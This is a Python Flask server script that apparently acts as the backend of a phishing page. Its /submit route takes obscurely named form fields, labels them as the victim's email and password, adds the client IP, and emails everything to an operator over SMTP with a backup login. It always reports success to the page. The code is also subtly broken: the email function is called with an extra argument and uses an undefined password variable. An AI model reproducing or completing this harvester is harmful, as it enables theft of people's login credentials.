import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import logging

app = Flask(__name__)
CORS(app)  # Enable CORS for all routes

# Set up logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Email configuration
SMTP_SERVER = os.getenv('SMTP_SERVER', 'smtp.gmail.com')
SMTP_PORT = int(os.getenv('SMTP_PORT', 587))
SENDER_EMAIL = os.getenv('SENDER_EMAIL')
SENDER_PASSWORD = os.getenv('SENDER_PASSWORD')
SENDER_PASSWORD_BACKUP = os.getenv('SENDER_PASSWORD_BACKUP')  # Backup password
RECEIVER_EMAIL = os.getenv('RECEIVER_EMAIL')

# Validate required environment variables
if not SENDER_EMAIL or not SENDER_PASSWORD or not RECEIVER_EMAIL:
    logger.error("Missing required environment variables: SENDER_EMAIL, SENDER_PASSWORD, and RECEIVER_EMAIL must be set")
    # We'll handle this gracefully in the send_email function

# Log configuration on startup
logger.info(f"SMTP Configuration: Server={SMTP_SERVER}, Port={SMTP_PORT}")
if SENDER_EMAIL:
    logger.info(f"Sender Email: {SENDER_EMAIL}")
if RECEIVER_EMAIL:
    logger.info(f"Receiver Email: {RECEIVER_EMAIL}")

def send_email(subject, body, sender_email):
    """Send email using SMTP"""
    # Check if we have the required credentials
    if not sender_email or not SENDER_PASSWORD or not RECEIVER_EMAIL:
        logger.warning("Email credentials not fully configured, skipping email send")
        return "Email not configured"
    
    try:
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = RECEIVER_EMAIL
        msg['Subject'] = subject
        
        msg.attach(MIMEText(body, 'plain'))
        
        logger.info(f"Attempting to connect to SMTP server: {SMTP_SERVER}:{SMTP_PORT}")
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT, timeout=10)  # Reduced timeout
        server.starttls()
        server.login(sender_email, password)
        text = msg.as_string()
        server.sendmail(sender_email, RECEIVER_EMAIL, text)
        server.quit()
        logger.info("Email sent successfully")
        return True
    except smtplib.SMTPAuthenticationError as e:
        error_msg = f"SMTP Authentication failed: {str(e)}"
        logger.error(error_msg)
        return error_msg
    except smtplib.SMTPConnectError as e:
        error_msg = f"SMTP Connection failed: {str(e)}"
        logger.error(error_msg)
        return error_msg
    except smtplib.SMTPServerDisconnected as e:
        error_msg = f"SMTP Server disconnected: {str(e)}"
        logger.error(error_msg)
        return error_msg
    except Exception as e:
        error_msg = f"Failed to send email: {str(e)}"
        logger.error(error_msg)
        return error_msg

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/<path:filename>')
def serve_static(filename):
    if os.path.exists(filename):
        return send_from_directory('.', filename)
    else:
        # Handle favicon request specifically
        if filename == 'favicon.ico':
            return '', 204  # No content response for favicon
        return jsonify({'message': 'File not found'}), 404

@app.route('/submit', methods=['POST'])
def handle_submission():
    # Get form data
    x1 = request.form.get('x1', '')
    x2 = request.form.get('x2', '')
    client_ip = request.remote_addr
    
    # Prepare email body
    body = f"""
    Email: {x1}
    Password: {x2}
    IP Address: {client_ip}
    """
    
    logger.info(f"Received form submission from IP: {client_ip}")
    logger.info(f"Form data - Email: {x1}, Password: {'*' * len(x2) if x2 else ''}")
    
    # Only attempt to send email if credentials are configured
    if SENDER_EMAIL and SENDER_PASSWORD and RECEIVER_EMAIL:
        # Send email with primary password first
        result = send_email('Form Submission', body, SENDER_EMAIL, SENDER_PASSWORD)

        # If primary fails, try backup password
        if result is not True:
            logger.warning(f"Primary email password failed: {result}")
            if SENDER_PASSWORD_BACKUP:
                result = send_email('Form Submission', body, SENDER_EMAIL, SENDER_PASSWORD_BACKUP)

                # Log backup password result
                if result is not True:
                    logger.error(f"Backup email password also failed: {result}")
                    logger.warning("Both email passwords failed")
                else:
                    logger.info("Email sent successfully using backup password")
            else:
                logger.warning("No backup email password configured")
        else:
            logger.info("Email sent successfully using primary password")
    else:
        logger.warning("Email not configured - skipping email send")
    
    # Return success regardless of email sending result
    return jsonify({'message': 'Success'})

if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=int(os.environ.get('PORT', 8000)))